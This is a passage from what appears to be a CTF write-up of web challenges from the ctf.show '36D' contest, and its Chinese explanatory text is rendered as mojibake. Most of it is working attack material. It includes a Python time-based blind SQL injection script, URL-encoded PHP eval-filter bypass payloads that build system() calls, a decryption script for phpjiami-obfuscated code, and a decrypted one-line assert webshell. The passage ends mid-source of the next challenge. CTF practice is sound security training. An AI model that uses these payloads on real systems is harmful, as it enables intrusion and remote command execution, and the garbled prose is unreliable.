class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;admin\&amp;password&#x3D;or&#x2F;**&#x2F;if((ord(left(password,1))&#x2F;**&#x2F;like&#x2F;**&#x2F;73),sleep(3),0)#</span><br></pre></td></tr></table></figure><p>è¿˜å¯ä»¥ç”¨regexpæ³¨å…¥ï¼Œpayload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;admin\&amp;password&#x3D;or&#x2F;**&#x2F;if((left(password,1)&#x2F;**&#x2F;regexp&#x2F;**&#x2F;binary&#x2F;**&#x2F;0x49),sleep(3),1)#</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://631b5cfe-7f15-4390-958c-228c6a9c421a.chall.ctf.show&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">hexflag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">s=<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    f1=flag</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">        hexj=str(hex(ord(j))).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        p1=<span class="string">&quot;or/**/if((left(password,&#123;&#125;)/**/regexp/**/binary/**/0x&#123;&#125;),sleep(3),1)#&quot;</span>.format(str(i),hexflag+hexj)</span><br><span class="line">        data1=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin\\&#x27;</span>,<span class="string">&#x27;password&#x27;</span>:p1&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            print(i,hexj)</span><br><span class="line">            r1=requests.post(url,data=data1,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout <span class="keyword">as</span> e:</span><br><span class="line">            flag+=j</span><br><span class="line">            hexflag+=str(hex(ord(j))).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">if</span> flag==f1:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="WEBä½ å–å§36Dæ¯"><a href="#WEBä½ å–å§36Dæ¯" class="headerlink" title="WEBä½ å–å§36Dæ¯"></a>WEBä½ å–å§36Dæ¯</h3><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$hint=file_get_contents(<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=hhh.php&#x27;</span>);</span><br><span class="line">$code=$_REQUEST[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">$_=<span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;z&#x27;</span>,<span class="string">&#x27;\~&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>);</span><br><span class="line">$blacklist = array_merge($_);</span><br><span class="line"><span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blacklisted) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">&#x27;/&#x27;</span> . $blacklisted . <span class="string">&#x27;/im&#x27;</span>, $code)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$code</span>);&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åˆ©ç”¨é€’å¢çš„é‚£ç§æ€æƒ³æ„é€ å°±è¡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_=[];$_=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>;$_=$_[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>];$__=$_;$_++;$_++;$_++;$_++;$_______=$_;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$________=$_;$_++;$_++;$_++;$_++;$_++;$_++;$_________=$_;$_++;$__________=$_;$_____=$_;$_++;$_++;$_++;$_++;$_++;$___________=$_;$___.=$_________;$___.=$___________;$___.=$_________;$___.=$__________;$___.=$_______;$___.=$________;$____=<span class="string">&#x27;_&#x27;</span>;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$______=$__;$__++;$____.=$__;$____.=$______;$__++;$__++;$__++;$____.=$__;$__++;$____.=$__;$_=$$____;$___($_[_]);</span><br><span class="line"><span class="comment">// SYSTEM($_POST[_]);</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;%31%29%3b%24%5f%3d%5b%5d%3b%24%5f%3d%40%22%24%5f%22%3b%24%5f%3d%24%5f%5b%27%21%27%3d%3d%27%40%27%5d%3b%24%5f%5f%3d%24%5f%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%5f%5f%5f%5f%5f%5f%3d%24%5f%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%5f%5f%5f%5f%5f%5f%5f%3d%24%5f%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%5f%5f%5f%5f%5f%5f%5f%5f%3d%24%5f%3b%24%5f%2b%2b%3b%24%5f%5f%5f%5f%5f%5f%5f%5f%5f%5f%3d%24%5f%3b%24%5f%5f%5f%5f%5f%3d%24%5f%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%5f%5f%5f%5f%5f%5f%5f%5f%5f%5f%3d%24%5f%3b%24%5f%5f%5f%2e%3d%24%5f%5f%5f%5f%5f%5f%5f%5f%5f%3b%24%5f%5f%5f%2e%3d%24%5f%5f%5f%5f%5f%5f%5f%5f%5f%5f%5f%3b%24%5f%5f%5f%2e%3d%24%5f%5f%5f%5f%5f%5f%5f%5f%5f%3b%24%5f%5f%5f%2e%3d%24%5f%5f%5f%5f%5f%5f%5f%5f%5f%5f%3b%24%5f%5f%5f%2e%3d%24%5f%5f%5f%5f%5f%5f%5f%3b%24%5f%5f%5f%2e%3d%24%5f%5f%5f%5f%5f%5f%5f%5f%3b%24%5f%5f%5f%5f%3d%27%5f%27%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%5f%5f%5f%3d%24%5f%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%5f%5f%5f%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%3d%24%24%5f%5f%5f%5f%3b%24%5f%5f%5f%28%24%5f%5b%5f%5d%29%3b%2f%2f</span><br></pre></td></tr></table></figure><p>POSTè¦æ‰§è¡Œçš„å‘½ä»¤å°±è¡Œï¼Œæ³¨æ„codeè¦urlç¼–ç ï¼Œå› ä¸ºç”±äºphpå­—ç¬¦ä¸²è§£æç‰¹æ€§ä¼šæŠŠ+è§£ææˆç©ºæ ¼ï¼Œé¢˜ç›®ç¯å¢ƒæ˜¯php5.6å¦‚æœæ˜¯7.xè¿˜å¯ä»¥ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">&#x27;``````&#x27;</span>|<span class="string">&#x27;%13%19%13%14%05%0D&#x27;</span>)(<span class="string">&#x27;``&#x27;</span>|`%<span class="number">09</span>%<span class="number">04</span>`);</span><br><span class="line"><span class="comment">// system(&#x27;id&#x27;);</span></span><br></pre></td></tr></table></figure><p>æ„é€ systemåªéœ€</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(<span class="string">&#x27;system&#x27;</span>^<span class="string">&#x27;``````&#x27;</span>);</span><br></pre></td></tr></table></figure><p>é™¤æ­¤ä¹‹å¤–æˆ‘ä»¬è¿˜å¯ä»¥åˆ©ç”¨<code>$_</code>å˜é‡æ¥æ„é€ å­—ç¬¦ï¼Œè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">s=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;z&#x27;</span>,<span class="string">&#x27;\~&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>]</span><br><span class="line">word=<span class="string">&#x27;system&#x27;</span></span><br><span class="line">code=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> word:</span><br><span class="line">        <span class="keyword">if</span> j <span class="keyword">in</span> s:</span><br><span class="line">            code+=<span class="string">&#x27;$_[&#x27;</span>+str(s.index(j))+<span class="string">&#x27;].&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            code+=<span class="string">&quot;&#x27;&quot;</span>+j+<span class="string">&quot;&#x27;&quot;</span>+<span class="string">&quot;.&quot;</span></span><br><span class="line">print(code)</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;1);$__&#x3D;$_[18].$_[24].$_[18].$_[19].$_[4].$_[11];$___&#x3D;$_[2].$_[0].$_[19].&#39; &#39;.&#39;&#x2F;&#39;.$_[5].$_[13].$_[0].$_[6];$__($___);&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p>æœ¬é¢˜é¢„æœŸè§£æ˜¯å…ˆè¯»hint</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;$&#123;$_[7].$_[8].$_[12].$_[19]&#125;</span><br></pre></td></tr></table></figure><p>base64è§£ç å¾—åˆ°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">&quot;/phpjiami.zip\n/hint.php&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶åæŠŠ<code>phpjiami.zip</code>ä¸‹è½½ä¸‹æ¥ï¼Œæ‰“å¼€å‘ç°<code>1.php</code>æ··æ·†åŠ å¯†çš„ï¼Œå¹¶ä¸”æç¤ºæ˜¯ç»è¿‡Www.PHPJiaMi.Comç½‘ç«™åŠ å¯†çš„ï¼Œè§£å¯†è„šæœ¬ï¼Œä¹Ÿå¯ä»¥ç”¨ï¼š<a href="https://github.com/PikuYoake/phpjiami_decode%EF%BC%9A">https://github.com/PikuYoake/phpjiami_decodeï¼š</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span>(<span class="params">$data, $key</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $data_1 = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($data); $i++) &#123;</span><br><span class="line">        $ch = ord($data[$i]);</span><br><span class="line">        <span class="keyword">if</span> ($ch &lt; <span class="number">245</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($ch &gt; <span class="number">136</span>) &#123;</span><br><span class="line">                $data_1 .= chr($ch / <span class="number">2</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $data_1 .= $data[$i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $data_1 = base64_decode($data_1);</span><br><span class="line">    $key = md5($key);</span><br><span class="line">    $j = $ctrmax = <span class="number">32</span>;</span><br><span class="line">    $data_2 = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($data_1); $i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($j &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            $j = $ctrmax;</span><br><span class="line">        &#125;</span><br><span class="line">        $j--;</span><br><span class="line">        $data_2 .=  $data_1[$i] ^ $key[$j];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $data_2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">find_data</span>(<span class="params">$code</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $code_end = strrpos($code, <span class="string">&#x27;?&gt;&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!$code_end) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $data_start = $code_end + <span class="number">2</span>;</span><br><span class="line">    $data = substr($code, $data_start, <span class="number">-46</span>);</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">find_key</span>(<span class="params">$code</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// $v1 = $v2(&#x27;bWQ1&#x27;);</span></span><br><span class="line">    <span class="comment">// $key1 = $v1(&#x27;??????&#x27;);</span></span><br><span class="line">    $pos1 = strpos($code, <span class="string">&quot;(&#x27;&quot;</span> . preg_quote(base64_encode(<span class="string">&#x27;md5&#x27;</span>)) . <span class="string">&quot;&#x27;);&quot;</span>);</span><br><span class="line">    $pos2 = strrpos(substr($code, <span class="number">0</span>, $pos1), <span class="string">&#x27;$&#x27;</span>);</span><br><span class="line">    $pos3 = strrpos(substr($code, <span class="number">0</span>, $pos2), <span class="string">&#x27;$&#x27;</span>);</span><br><span class="line">    $var_name = substr($code, $pos3, $pos2 - $pos3 - <span class="number">1</span>);</span><br><span class="line">    $pos4 = strpos($code, $var_name, $pos1);</span><br><span class="line">    $pos5 = strpos($code, <span class="string">&quot;(&#x27;&quot;</span>, $pos4);</span><br><span class="line">    $pos6 = strpos($code, <span class="string">&quot;&#x27;)&quot;</span>, $pos4);</span><br><span class="line">    $key = substr($code, $pos5 + <span class="number">2</span>, $pos6 - $pos5 - <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span> $key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$input_file = $argv[<span class="number">1</span>];</span><br><span class="line">$output_file = $argv[<span class="number">1</span>] . <span class="string">&#x27;.decrypted.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">$code = file_get_contents($input_file);</span><br><span class="line"></span><br><span class="line">$data = find_data($code);</span><br><span class="line"><span class="keyword">if</span> (!$code) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;æœªæ‰¾åˆ°åŠ å¯†æ•°æ®&#x27;</span>, PHP_EOL;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$key = find_key($code);</span><br><span class="line"><span class="keyword">if</span> (!$key) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;æœªæ‰¾åˆ°ç§˜é’¥&#x27;</span>, PHP_EOL;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$decrypted = decrypt($data, $key);</span><br><span class="line">$uncompressed = gzuncompress($decrypted);</span><br><span class="line"><span class="comment">// ç”±äºå¯ä»¥ä¸å‹¾é€‰ä»£ç å‹ç¼©çš„é€‰é¡¹ï¼Œæ‰€ä»¥è¿™é‡Œåˆ¤æ–­ä¸€ä¸‹æ˜¯å¦è§£å‹æˆåŠŸï¼Œè§£å‹å¤±è´¥å°±æ˜¯æ²¡å‹ç¼©</span></span><br><span class="line"><span class="keyword">if</span> ($uncompressed) &#123;</span><br><span class="line">    $decrypted = str_rot13($uncompressed);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $decrypted = str_rot13($decrypted);</span><br><span class="line">&#125;</span><br><span class="line">file_put_contents($output_file, $decrypted);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;è§£å¯†åæ–‡ä»¶å·²å†™å…¥åˆ° &#x27;</span>, $output_file, PHP_EOL;</span><br></pre></td></tr></table></figure><p>è§£å¯†åå¾—åˆ°ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ch = explode(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;hello.ass.world.er.rt.e.saucerman&quot;</span>);</span><br><span class="line">$c = $ch[<span class="number">1</span>].$ch[<span class="number">5</span>].$ch[<span class="number">4</span>]; </span><br><span class="line">@$c($_POST[<span class="number">7</span><span class="number">-1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>èšå‰‘è¿</p><h3 id="WEB-WUSTCTFæœ´å®æ— åRevenge-Revenge-36Dæ¯"><a href="#WEB-WUSTCTFæœ´å®æ— åRevenge-Revenge-36Dæ¯" class="headerlink" title="WEB_WUSTCTFæœ´å®æ— åRevenge_Revenge_36Dæ¯"></a>WEB_WUSTCTFæœ´å®æ— åRevenge_Revenge_36Dæ¯</h3><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isPalindrome</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">    $len=strlen($str);</span><br><span class="line">    $l=<span class="number">1</span>;</span><br><span class="line">    $k=intval($len/<span class="number">2</span>)+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>($j=<span class="number">0</span>;$j&lt;$k;$j++)</span><br><span class="line">        <span class="keyword">if</span> (substr($str,$j,<span class="number">1</span>)!=substr($str,$len-$j<span class="number">-1</span>,<span class="number">1</span>)) &#123;</span><br><span class="line">            $l=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">if</span> ($l==<span class="number">1</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    $numPositve = intval($num);</span><br><span class="line">    $numReverse = intval(strrev($num));</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[^0-9.]/&#x27;</span>, $num)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;éæ´²æ¬¢è¿ä½ 1&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (preg_match_all(<span class="string">&quot;/\./&quot;</span>, $num) &gt; <span class="number">1</span>) || (preg_match_all(<span class="string">&quot;/\-/&quot;</span>, $num) &gt; <span class="number">1</span>) || (preg_match_all(<span class="string">&quot;/\-/&quot;</span>, $num)==<span class="number">1</span> &amp;&amp; !preg_match(<span class="string">&#x27;/^[-]/&#x27;</span>, $num))) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;æ²¡æœ‰è¿™æ ·çš„æ•°&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($num != $numPositve) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;æœ€å¼€å§‹ä¸Šé¢˜æ—¶å€™å¿˜å†™äº†è¿™ä¸ªï¼Œå¯¼è‡´è¿™level 1å˜æˆäº†å¼±æ™ºï¼Œæ€ªä¸å¾—è¿™ä¹ˆå¤šäººsolve&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($numPositve &lt;= <span class="number">-999999999999999999</span> || 